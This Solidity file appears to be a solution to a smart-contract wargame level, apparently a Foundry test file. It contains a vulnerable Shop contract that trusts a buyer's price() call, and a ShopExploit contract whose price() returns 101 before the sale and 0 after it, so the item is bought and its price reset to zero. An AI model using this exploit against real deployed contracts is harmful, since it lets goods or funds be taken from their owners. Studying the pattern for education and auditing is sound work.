// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopExploit {
    Shop victim;

    constructor(address _victim){
        victim = Shop(_victim);
    }

    function price() external view returns (uint){
        return victim.isSold() ? 0 : 101;
    }

    function buyLower() public {
        victim.buy();
    }
}